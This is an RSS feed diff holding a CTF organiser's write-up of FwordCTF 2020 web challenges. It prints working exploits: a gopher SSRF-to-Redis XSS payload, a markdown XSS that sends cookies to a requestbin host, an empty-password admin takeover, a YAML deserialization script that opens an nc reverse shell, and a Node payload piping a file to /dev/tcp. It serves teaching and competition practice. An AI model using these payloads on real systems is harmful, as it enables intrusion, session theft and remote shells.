@@ -1196,5 +1196,281 @@ that automates this and FINALLY we got The flag :&lt;/p&gt;
       <description></description>
     </item>
     
+    <item>
+      <title>FwordCTF 2020 - Web/Bash Writeups</title>
+      <link>https://ahmed-belkahla.me/post/fword-ctf2020/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/fword-ctf2020/</guid>
+      <description>&lt;h1 id=&#34;fwordctf-2020-webbash-writeups-&#34;&gt;FwordCTF 2020 Web+Bash writeups&lt;/h1&gt;
+&lt;p&gt;Our team Fword organized FwordCTF 2020 with more than 900 teams and 1900 participants , I&amp;rsquo;ve been in charge of managing the infrastructure and Web + Bash categories, we will discuss infrastructure stuffs in future articles and how to  deploy things as our platform got a maximum of 2mins down and tasks had 0 down time.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Mw8OoKF.png&#34; alt=&#34;STATS&#34;&gt;&lt;/p&gt;
+&lt;p&gt;However in this article we will discuss the possible ways of solving my Web / Bash tasks.&lt;/p&gt;
+&lt;h2 id=&#34;pastaxss-5-solves-500pts-&#34;&gt;PastaXSS (5 solves) 500pts&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/F4BHxkK.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This task was a symfony project and we were given the souce code (in fact all tasks had the source code attached to avoid any possible ways of guess).&lt;/p&gt;
+&lt;h3 id=&#34;enumeration-&#34;&gt;Enumeration&lt;/h3&gt;
+&lt;p&gt;When you visit the website we have a register/login page, after creating an account we can notice that we have the possibility to post a &lt;strong&gt;jutsu&lt;/strong&gt; with markdown possibility.
+There is also a feature in the website that let us import a jutsu from a website, hmmm I smell some SSRF vector here. There is also a report admin page that only accepts
+&lt;code&gt;http://web1.fword.wtf/jutsu/{id}&lt;/code&gt; .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/XY4Rj5I.png&#34; alt=&#34;HOME&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Markdown in jutsu:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/mUvo0j4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;Taking a look at the source code, you can notice in this part that the web page is using some caching , things began to be interesting here (SSRF+caching can lead to some juicy results)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;JutsusController.php&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+public function viewJutsu($id,EntityManagerInterface $em,CacheInterface $cache,MarkdownParserInterface $markdown){
+       $repo=$em-&amp;gt;getRepository(Jutsus::class);
+       $jutsu=$repo-&amp;gt;findOneBy([&amp;quot;id&amp;quot;=&amp;gt;$id]);
+       $this-&amp;gt;denyAccessUnlessGranted(&amp;quot;SHOW&amp;quot;,$jutsu);
+       //fetch jutsu + htmlspecialchars+markdown
+       $name=$jutsu-&amp;gt;getName();
+       $desc=htmlspecialchars($jutsu-&amp;gt;getDescription());
+       $description=$cache-&amp;gt;get(&amp;quot;jutsu&amp;quot;.$jutsu-&amp;gt;getId(),function()use($markdown,$desc){
+           return $markdown-&amp;gt;transformMarkdown($desc);
+       });
+       $publishedAt=$jutsu-&amp;gt;getPublishedAt()-&amp;gt;format(&#39;Y-m-d H:i:s&#39;);
+       $author=$jutsu-&amp;gt;getUser();
+       return $this-&amp;gt;render(&amp;quot;jutsus/show.html.twig&amp;quot;,[&amp;quot;name&amp;quot;=&amp;gt;$name,&amp;quot;description&amp;quot;=&amp;gt;$description,&amp;quot;publishedAt&amp;quot;=&amp;gt;$publishedAt,&amp;quot;author&amp;quot;=&amp;gt;$author]);
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And this is the part where &lt;strong&gt;curl&lt;/strong&gt; was used (a symfony service created) :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+class Curl
+{
+   public function fetch(string $url):string {
+       $response = shell_exec(&amp;quot;curl &#39;&amp;quot;.escapeshellcmd($url).&amp;quot;&#39; -s --max-time 6&amp;quot;);
+       preg_replace(&#39;/&amp;lt;title&amp;gt;(.*)&amp;lt;\/title&amp;gt;/i&#39;,&#39;&#39;,$response);
+       return (!empty($response)?substr($response,0,780):&amp;quot;&amp;quot;);
+
+   }
+   public function extractTitle(string $url):string{
+       $response=$this-&amp;gt;fetch($url);
+       $output=array();
+       preg_match(&#39;/&amp;lt;title&amp;gt;(.*)&amp;lt;\/title&amp;gt;/i&#39;,$response,$output);
+       return (array_key_exists(1,$output) ? $output[1]:&amp;quot;Unknown Jutsu&amp;quot;);
+
+   }
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So we can notice that if we can edit the cached version to have my XSS payload we will bypass htmlspecialchars sanitization and get our javascript code executed. We can achieve this if we chain
+the SSRF to communicate with Redis caching system ( you can know from the configuration files that the system is using redis with the hostname redis).&lt;/p&gt;
+&lt;p&gt;Using gopher protocol we can communicate with all text based protocols including redis by just following this pattern:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;gopher://redis:6379/_REDIS Command&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;we need to firstly fetch all keys using &lt;strong&gt;KEYS *&lt;/strong&gt; but you can notice the use of escapeshellcmd that will escape * so we have to urlencode our payload in order to bypass this.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;gopher://redis:6379/_KEYS%20%2a&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This will fetch all jutsus for us&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/QZr5ljQ.png&#34; alt=&#34;RESULT&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now we only have to set that key to our XSS payload :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;gopher://redis:6379/_SET%20yLAP6wFwIy%3Ajutsu5598%20%27s%3A81%3A%22%3Cscript%20src%3D%22URL%22%3E%3C%2Fscript%3E%22%3B%27&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And Bingo you will get the flag :&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;FwordCTF{Y0u_Only_h4vE_T0_cH4in_4nd_Th1nk_w3ll}&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;There was an unintended solution that exploited a problem in the markdown parser (I contacted the developer to resolve this issue)&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;![&amp;lt;img src=&amp;quot;#&amp;quot; onerror=&amp;quot;src=&#39;http://requestbin.net/r/12bfihl1?c=&#39;+document.cookie; this.onerror=null&amp;quot;/&amp;gt;](#){onerror=outerHTML=alt}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;useless3-solves-500pts-&#34;&gt;Useless(3 solves) 500pts&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/r0HTsK7.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In this task we were given a flask project, when we open the website we can notice in the login page the possibility to login using github.After creating an account and signing in we don&amp;rsquo;t see anything special.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/O60WJr5.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s get a look on the source code, after some digging, this part seems interesting, it&amp;rsquo;s the logic handling the Github Oauth.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;@oauth_authorized.connect_via(github_authbp)
+def github_oauth(github_authbp,token):
+    if not github.authorized:
+        return redirect(url_for(&amp;quot;github.login&amp;quot;))
+    resp = github.get(&amp;quot;/user&amp;quot;)
+    if not resp.ok:
+        return redirect(url_for(&amp;quot;github.login&amp;quot;))
+    info=resp.json()
+    auth=oauth.OAuth.query.filter_by(provider_user_id=info[&amp;quot;id&amp;quot;]).first()
+    if auth is None:
+        auth = oauth.OAuth(provider=&amp;quot;github&amp;quot;, provider_user_id=info[&amp;quot;id&amp;quot;], token=token)
+        if auth.user:
+            login_user(auth.user)
+            return redirect(&amp;quot;/home&amp;quot;,302)
+        else:
+            if not validate_username(info[&amp;quot;login&amp;quot;]):
+                return redirect(&amp;quot;/register&amp;quot;)
+            if info[&amp;quot;login&amp;quot;]==&amp;quot;fwordadmin&amp;quot;:
+                user = users.User(username=info[&amp;quot;login&amp;quot;], email=info[&amp;quot;email&amp;quot;],is_admin=True)
+            else:
+                user=users.User(username=info[&amp;quot;login&amp;quot;],email=info[&amp;quot;email&amp;quot;])
+            auth.user=user
+            base.db_session.add_all([user,auth])
+            base.db_session.commit()
+            login_user(user)
+            return redirect(&amp;quot;/home&amp;quot;,302)
+    else:
+        login_user(auth.user)
+        return redirect(&amp;quot;/home&amp;quot;, 302)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The meaning of this code (for lazy people :p ) when a user completes the Oauth dance successfully for the first time he will be registered in the database in the User table and we can also notice that &lt;strong&gt;fwordadmin&lt;/strong&gt; is the github account of the admin (this information will help us next).&lt;/p&gt;
+&lt;p&gt;Now our goal is to login using fwordadmin account, there&amp;rsquo;s something suspicious in the previous code, when you connect via github you don&amp;rsquo;t need any password but indeed the user is still
+saved in the same table where regular registrations are stored so we have to wonder what password is set by default or is there some column to verify the login method (which is not the case).&lt;/p&gt;
+&lt;p&gt;The User class confirms our statement, the default password is set to &amp;quot;&amp;rdquo;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class User(UserMixin,Base):
+    __tablename__ = &#39;users&#39;
+    id = Column(Integer, primary_key=True)
+    username = Column(String(50), unique=True)
+    email = Column(String(120), unique=True)
+    password_hash=Column(String(200))
+    is_admin=Column(Boolean)
+    def __init__(self, username=None, email=None,password=&amp;quot;&amp;quot;,is_admin=False):
+        self.username = username
+        self.email = email
+        print(&amp;quot;pass :&amp;quot;+password)
+        self.set_password(password)
+        self.is_admin=is_admin
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So if we connect with the following credentials we will takeover the admin account:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;login: fwordadmin
+password: //
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There is a check that removes special characters so the password will be interpreted as &amp;quot;&amp;rdquo; at the end.&lt;/p&gt;
+&lt;p&gt;Now we have access to the admin panel that has a feature that parses docker-compose files (yaml file) so even without reading the source code we can know that is a yaml unsafe deserialization exploit.&lt;/p&gt;
+&lt;p&gt;The vulnerable code:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def parse(text):
+    try:
+        res = yaml.load(text, Loader=Loader)
+        return res
+    except Exception:
+        return &amp;quot;An Error has occured&amp;quot;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is my final exploit that spawns a reverse shell:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import yaml,subprocess,requests
+
+class Payload(object):
+        def __reduce__(self):
+                return (subprocess.Popen,(tuple(&#39;nc IP PORT -e /bin/bash&#39;.split(&amp;quot; &amp;quot;)),))
+deserialized_data = yaml.dump(Payload())  
+data1={&amp;quot;username&amp;quot;:&amp;quot;fwordadmin&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;////&amp;quot;}
+print(&amp;quot;[+] Payload is: &amp;quot;+deserialized_data)
+#yaml.load(deserialized_data,Loader=yaml.Loader)
+data2={&amp;quot;service&amp;quot;:deserialized_data}
+s=requests.Session()
+r=s.post(&amp;quot;https://useless.fword.wtf/login&amp;quot;,data=data1)
+if r.status_code==200:
+        print(&amp;quot;[+] Logged in successfully&amp;quot;)
+r=s.post(&amp;quot;https://useless.fword.wtf/home&amp;quot;,data=data2)
+print(&amp;quot;[+] Shell Spawned, check your listener)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I hope you had fun solving this task and learned from it , i tried to inspire it from a project in my internship .&lt;/p&gt;
+&lt;h2 id=&#34;otaku-8-solves-500pts-&#34;&gt;Otaku (8 solves) 500pts&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/GduvVgP.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This was a Node Js application with its source code as always (i tried to use all known languages in the web tasks xd), opening the website we have a simple login/register page and a home page.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/4IZ3mAW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Home Page:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/8y6Dccr.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We have an update feature after connecting to update our favorite anime and username, le&amp;rsquo;s have a look at its source code:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;app.post(&amp;quot;/update&amp;quot;,(req,res)=&amp;gt;{
+        try{
+        if(req.session.username &amp;amp;&amp;amp; req.session.anime){
+                if(req.body.username &amp;amp;&amp;amp; req.body.anime){
+                        var query=JSON.parse(`{&amp;quot;$set&amp;quot;:{&amp;quot;username&amp;quot;:&amp;quot;${req.body.username}&amp;quot;,&amp;quot;anime&amp;quot;:&amp;quot;${req.body.anime}&amp;quot;}}`);
+                        client.connect((err)=&amp;gt;{
+                                if (err) return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;An unknown error has occured&amp;quot;});
+                                const db=client.db(&amp;quot;kimetsu&amp;quot;);
+                                const collection=db.collection(&amp;quot;users&amp;quot;);
+                                collection.findOne({&amp;quot;username&amp;quot;:req.body.username},(err,result)=&amp;gt;{
+                                        if (err) {return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;An unknown error has occured&amp;quot;});console.log(err);}
+                                        if (result) return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;This username already exists, Please use another one&amp;quot;});});
+                                collection.findOneAndUpdate({&amp;quot;username&amp;quot;:req.session.username},query,{ returnOriginal: false },(err,result)=&amp;gt;{
+                                        if (err) return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;An unknown error has occured&amp;quot;});
+                                        var newUser={};
+                                        var attrs=Object.keys(result.value);
+                                        attrs.forEach((key)=&amp;gt;{
+                                                newUser[key.trim()]=result.value[key];
+                                                if(key.trim()===&amp;quot;isAdmin&amp;quot;){
+                                                        newUser[&amp;quot;isAdmin&amp;quot;]=0;
+                                                }
+                                        });
+                                        req.session.username=newUser.username;
+                                        req.session.anime=newUser.anime;
+                                        req.session.isAdmin=newUser.isAdmin;
+                                        req.session.save();
+                                        return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;Updated Successfully&amp;quot;});
+                                });
+                        });
+
+                }
+                else return res.render(&amp;quot;update&amp;quot;,{error:&amp;quot;An unknown error has occured&amp;quot;});
+        }
+        else res.redirect(302,&amp;quot;/login&amp;quot;);
+}
+catch(err){
+        console.log(err);
+}
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can easily notice the NoSQL injection in &lt;code&gt; var query=JSON.parse(`{&amp;quot;$set&amp;quot;:{&amp;quot;username&amp;quot;:&amp;quot;${req.body.username}&amp;quot;,&amp;quot;anime&amp;quot;:&amp;quot;${req.body.anime}&amp;quot;}}`);&lt;/code&gt; and prototype pollution here :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; var newUser={};
+var attrs=Object.keys(result.value);
+attrs.forEach((key)=&amp;gt;{
+ newUser[key.trim()]=result.value[key];
+if(key.trim()===&amp;quot;isAdmin&amp;quot;){
+newUser[&amp;quot;isAdmin&amp;quot;]=0;
+  }
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Our goal is to set isAdmin to 1, the prototype pollution vulnerable part is parsing the result json object of NoSQL query, so if we chain the NoSQL injection with prototype
+pollution we will have the possibility to set isAdmin to 1, we can achieve this by injecting the following in anime field:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;brrr&amp;rdquo;,&amp;rdquo;   &lt;strong&gt;proto&lt;/strong&gt;&amp;rdquo; : {&amp;ldquo;isAdmin&amp;rdquo;:1}, &amp;ldquo;aaaa&amp;rdquo;:&amp;ldquo;aaa&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;W don&amp;rsquo;t have to forget the whitespace before &lt;code&gt;__proto__&lt;/code&gt; because mongo doesn&amp;rsquo;t accept it by default but we can notice the usage of trim() so adding some whitespace will do the trick.&lt;/p&gt;
+&lt;p&gt;Now we have admin access:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/kGcC3xI.png&#34; alt=&#34;ADMIN&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In the admin panel we have the possibility to set an environment variable and run a js script, the intended idea is to set &lt;code&gt;NODE_VERSION&lt;/code&gt; env variable to some js code followed by // and then execute /proc/self/environ.
+The content of /proc/self/environ will be interpreted as Js code ( we chose NODE_VERSION because it&amp;rsquo;s the first env var, we knew it by connecting to the node docker image and checking its environment variables).&lt;/p&gt;
+&lt;p&gt;Final payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;envname: NODE_VERSION
+
+env: process.mainModule.require(&#39;child_process&#39;).exec(&amp;quot;bash -c \&amp;quot; cat /flag.txt &amp;gt; /dev/tcp/IP/PORT\&amp;quot;&amp;quot;); //
+
+path: /proc/self/environ
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And Bingo we got our flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/DNO9m4H.png&#34; alt=&#34;FLAG&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;other-writeups-&#34;&gt;Other Writeups&lt;/h3&gt;
+&lt;p&gt;Super Guesser Team writeups, they solved all web challenges :D 
+&lt;a href=&#34;https://github.com/Super-Guesser/ctf/tree/master/Fword%20CTF%202020/writeups&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LINK&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Hexion Team Otaku task writeup 
+&lt;a href=&#34;https://github.com/om3r-v/CTF-solutions/tree/master/FwordCTF/otaku&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LINK&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;bash-category-&#34;&gt;Bash Category&lt;/h2&gt;
+&lt;p&gt;These category included some privesc and jail challenges , some really nice writeups were written by the teams that participated, so i&amp;rsquo;ll put some links here (I&amp;rsquo;m just lazy to write my own writeups):&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;JailBoss:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;a href=&#34;https://github.com/FrigidSec/CTFWriteups/tree/master/FwordCTF/Bash/JailBoss&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;a href=&#34;https://github.com/s-3ntinel/writeups/blob/master/ctf/FwordCTF_2020/bash/JailBoss/README.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 2&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;CapiCapi&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;a href=&#34;https://github.com/Zarkrosh/ctf-writeups/tree/master/2020-FwordCTF#bash---capicapi&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;a href=&#34;https://github.com/PeterPHacker/fword-ctf-writeups/blob/master/README.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 2&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Bash is Fun&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;a href=&#34;https://github.com/s-3ntinel/writeups/blob/master/ctf/FwordCTF_2020/bash/BashIsFun/README.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;a href=&#34;https://github.com/Zarkrosh/ctf-writeups/tree/master/2020-FwordCTF#bash---bash-is-fun&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup 2&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;source-code-&#34;&gt;Source Code&lt;/h2&gt;
+&lt;p&gt;You can visit this github repo where i&amp;rsquo;ll publish all related things to FwordCTF 2020 ( I have already published the tasks source code )&lt;/p&gt;
+&lt;p&gt;
+&lt;a href=&#34;https://github.com/kahla-sec/FwordCTF-2020&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;FwordCTF 2020&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Thank you for reading the entire article, if you have any questions you can contact me on twitter @belkahlaahmed1 . organizing this huge CTF was really a unique experience and I learned a lot from it. Long life Fword Team you are just awesome guys.&lt;/p&gt;
+</description>
+    </item>
+    
   </channel>
 </rss>
